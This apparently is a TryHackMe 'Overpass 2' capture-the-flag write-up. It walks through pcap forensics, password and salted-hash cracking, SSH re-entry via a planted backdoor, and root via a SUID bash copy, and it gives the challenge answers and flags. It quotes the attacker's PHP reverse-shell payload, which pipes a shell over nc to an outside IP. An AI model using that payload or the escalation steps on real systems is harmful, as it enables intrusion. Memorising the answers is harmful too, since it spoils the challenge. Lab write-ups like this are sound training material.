# Overpass 2 - Hacked

# Forensic - Analyse the PCAP
~~~
Task 1
1. What was the URL of the page they used to upload a reverse shell? /development/
2. What payload did the attacker use to gain access? <?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
3. What password did the attacker use to privesc? whenevernoteartinstant
4. How did the attacker establish persistence? clone https://github.com/NinjaJc01/ssh-backdoor
5. Using the fasttrack wordlist, how many of the system passwords were crackable? 4
~~~

# Research - Analsye the code
~~~
Task 2
1. What's the default hash for the backdoor? bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3
2. What's the hardcoded salt for the backdoor? 1c362db832f3f864c8c2fe05f2002a05
3. What was the hash that the attacker used? - go back to the PCAP for this! 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
4.Crack the hash using rockyou and a cracking tool of your choice. What's the password? november16
~~~

# Attack - Get back in!
~~~
Task 3
1. The attacker defaced the website. What message did they leave as a heading? H4ck3d by CooctusClan
2. Using the information you've found previously, hack your way back in! Done
3. What's the user flag? thm{d119b4fa8c497ddb0525f7ad200e6567}
4. What's the root flag? thm{d53b2684f169360bb9606c333873144d}
~~~

# Analyse the PCAP
~~~
Look for a HTTP packet with POST request to see what was the page that was used to upload a reverse shell. Right-click on the HTTP packet, then click Follow, then HTTP stream;


Next is to look for TCP packet with PSH, ACK flags as they are signs of more data getting transmitted, so mostly a sign of persistence for me. Right-click on the packet you think is interesting and choose Follow, and then TCP Stream:


 On the same TCP Stream, we can see the list of users through the /etc/shadow with their hashed passwords. First, put the entries you found from /etc/shadow to a file and use John the Ripper to crack the hashed passwords. Type sudo john –wordlist=/usr/share/wordlists/fasttrack.txt >found.txt

john shadow.txt --wordlist=/usr/share/wordlists/fasttrack.txt > found.txt

cat found.txt
Loaded 5 password hashes with 5 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
secret12         (bee)     
abcd123          (szymex)     
1qaz2wsx         (muirland)     
secuirty3        (paradox)     
~~~

# Analyse the code
~~~
The next two questions can be answered by analyzing the script that was used for the persistent connection.

Next, we have to analyze which hash was used in conjunction with the hard-coded salt to retrieve our target password. There are only two hashes to choose from, and unluckily. So, I put one of the hashes and the salt together in a $pass:$salt format. And used a hash analyzer, I was able to identify that it was using SHA512 algorithm.

With the knowledge that the password was hashed using SHA512 algorithm, and it was salted, and uses the $pass:$salt format, I visited hash examples to check what hash mode I have to use when using Hashcat to crack it

results : 1710 - sha512($pass.$salt)

hashcat -m 1710 -o results.txt hash2.txt /usr/share/wordlists/rockyou.txt
~~~

# Getting back in
~~~
Check the website to see if the hackers left anything 

They did : H4ck3d by CooctusClan

└─$ nmap -sV -sC -Pn -v -oN nmap_report 10.10.62.198                                    
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-28 20:57 BST
Host is up (0.029s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e4:3a:be:ed:ff:a7:02:d2:6a:d6:d0:bb:7f:38:5e:cb (RSA)
|   256 fc:6f:22:c2:13:4f:9c:62:4f:90:c9:3a:7e:77:d6:d4 (ECDSA)
|_  256 15:fd:40:0a:65:59:a9:b5:0e:57:1b:23:0a:96:63:05 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: LOL Hacked
2222/tcp open  ssh     OpenSSH 8.2p1 Debian 4 (protocol 2.0)
| ssh-hostkey: 
|_  2048 a2:a6:d2:18:79:e3:b0:20:a2:4f:aa:b6:ac:2e:6b:f2 (RSA)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Using the username that we earlier say being exploited in the attack (PSH, ACK) James
i tried ssh (port 2222) with his original password from Question 3 but it didnt working so i used the new password we cracked november16 at it work!!

└─$ ssh -p 2222 james@10.10.241.3 -oHostKeyAlgorithms=+ssh-rsa
The authenticity of host '[10.10.241.3]:2222 ([10.10.241.3]:2222)' can't be established.
RSA key fingerprint is SHA256:z0OyQNW5sa3rr6mR7yDMo1avzRRPcapaYwOxjttuZ58.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.241.3]:2222' (RSA) to the list of known hosts.
james@10.10.241.3's password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

james@overpass-production:/home/james/ssh-backdoor$ 
james@overpass-production:/home/james/ssh-backdoor$ whoami
james
james@overpass-production:/home/james/ssh-backdoor$ ls
README.md  backdoor.service  cooctus.png  id_rsa.pub  main.go
backdoor   build.sh          id_rsa       index.html  setup.sh
james@overpass-production:/home/james/ssh-backdoor$ cd backdoor
bash: cd: backdoor: Not a directory
james@overpass-production:/home/james/ssh-backdoor$ ;s
bash: syntax error near unexpected token `;'
james@overpass-production:/home/james/ssh-backdoor$ cd ..
james@overpass-production:/home/james$ ls 
ssh-backdoor  user.txt  www
james@overpass-production:/home/james$ cat user.txt
thm{d119b4fa8c497ddb0525f7ad200e6567}
james@overpass-production:/home/james$ 
~~~

# Exploiting for root
~~~
james@overpass-production:/home/james$ ls -la
total 1136
drwxr-xr-x 7 james james    4096 Jul 22  2020 .
drwxr-xr-x 7 root  root     4096 Jul 21  2020 ..
lrwxrwxrwx 1 james james       9 Jul 21  2020 .bash_history -> /dev/null
-rw-r--r-- 1 james james     220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 james james    3771 Apr  4  2018 .bashrc
drwx------ 2 james james    4096 Jul 21  2020 .cache
drwx------ 3 james james    4096 Jul 21  2020 .gnupg
drwxrwxr-x 3 james james    4096 Jul 22  2020 .local
-rw------- 1 james james      51 Jul 21  2020 .overpass
-rw-r--r-- 1 james james     807 Apr  4  2018 .profile
-rw-r--r-- 1 james james       0 Jul 21  2020 .sudo_as_admin_successful
-rwsr-sr-x 1 root  root  1113504 Jul 22  2020 .suid_bash
drwxrwxr-x 3 james james    4096 Jul 22  2020 ssh-backdoor
-rw-rw-r-- 1 james james      38 Jul 22  2020 user.txt
drwxrwxr-x 7 james james    4096 Sep 28 20:51 www

check GTFO bins - https://gtfobins.github.io/gtfobins/bash/#suid

SUID
If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

sudo install -m =xs $(which bash) .

./bash -p

james@overpass-production:/home/james$ ./suid_bash -p
bash: ./suid_bash: No such file or directory
james@overpass-production:/home/james$ ./.suid_bash -p
.suid_bash-4.4# whoami
root
.suid_bash-4.4# ls
ssh-backdoor  user.txt  www
.suid_bash-4.4# cd ..
.suid_bash-4.4# ls
bee  james  muirland  paradox  szymex
.suid_bash-4.4# cd ..
.suid_bash-4.4# ls
bin    dev   initrd.img      lib64       mnt   root  srv       tmp  vmlinuz
boot   etc   initrd.img.old  lost+found  opt   run   swap.img  usr  vmlinuz.old
cdrom  home  lib             media       proc  sbin  sys       var
.suid_bash-4.4# cd root
.suid_bash-4.4# ls
root.txt
.suid_bash-4.4# cat root.txt
thm{d53b2684f169360bb9606c333873144d}
.suid_bash-4.4# 
~~~